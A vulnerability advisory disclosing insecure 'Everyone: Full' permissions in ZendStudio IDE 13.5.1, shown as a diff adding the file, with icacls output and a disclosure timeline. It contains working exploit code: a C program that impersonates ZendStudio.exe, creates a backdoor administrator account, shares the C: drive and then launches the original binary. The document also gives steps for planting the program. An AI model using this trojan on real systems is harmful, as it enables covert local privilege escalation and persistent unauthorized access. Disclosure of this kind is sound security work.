@@ -1,0 +1,134 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/ZEND-STUDIO-PRIVILEGE-ESCALATION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+============
+www.zend.com
+
+
+
+Product:
+======================
+ZendStudio IDE v13.5.1
+
+Zend Studio is the leading PHP IDE. It is the only PHP IDE that combines mobile development with PHP and includes a sample mobile
+app with source code.
+
+
+
+Vulnerability Type:
+=====================
+Privilege Escalation
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+ZendStudio IDE uses weak insecure permissions settings on its files/directory as the “Everyone” group has full access on it.
+Allowing low privileged users to execute arbitrary code in the security context of ANY other users with elevated privileges
+on the affected system.
+
+"Everyone" encompasses all users who have logged in with a password as well as built-in, non-password protected accounts such as Guest
+and LOCAL_SERVICE.
+
+Any user (even guest) will be able to replace, modify or change the file. This would allow an attacker the ability to inject code or
+replace the ZendStudio executable and have it run in the context of the system.
+
+
+e.g.
+
+c:\Program Files (x86)\Zend\Zend Studio 13.5.1> icacls ZendStudio.exe
+
+ZendStudio.exe Everyone:(I)(F)
+               NT AUTHORITY\SYSTEM:(I)(F)
+               BUILTIN\Administrators:(I)(F)
+               BUILTIN\Users:(I)(RX)
+
+
+x86_64 version ...
+
+
+c:\Program Files\Zend>icacls * | more
+Zend Studio 13.5.1 Everyone:(F)
+                   Everyone:(OI)(CI)(IO)(F)
+                   NT SERVICE\TrustedInstaller:(I)(F)
+                   NT SERVICE\TrustedInstaller:(I)(CI)(I
+                   NT AUTHORITY\SYSTEM:(I)(F)
+                   NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F
+                   BUILTIN\Administrators:(I)(F)
+                   BUILTIN\Administrators:(I)(OI)(CI)(IO
+                   BUILTIN\Users:(I)(RX)
+                   BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
+                   CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+
+
+Exploit code(s):
+===============
+
+1) Compile below 'C' code name it as "ZendStudio.exe"
+
+
+#include<windows.h>
+
+int main(void){
+ system("net user hacker abc123 /add");
+ system("net localgroup Administrators hacker  /add");
+ system("net share SHARE_NAME=c:\ /grant:hacker,full");
+ WinExec("C:\\Program Files (x86)\\Zend\\Zend Studio 13.5.1\\~ZendStudio.exe",0);
+return 0;
+} 
+
+
+2) Rename original "ZendStudio.exe" to "~ZendStudio.exe"
+
+
+3) Place our malicious "ZendStudio.exe" in the ZendStudio directory
+
+
+4) Logout and wait for a more privileged user to login and use ZendStudio IDE then BOOM!!!!! later,
+go back and login with your shiny new account.
+
+
+
+Disclosure Timeline:
+========================================
+Vendor Notification: September 30, 2016
+October 8, 2016 : Public Disclosure
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Severity Level:
+===============
+High
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
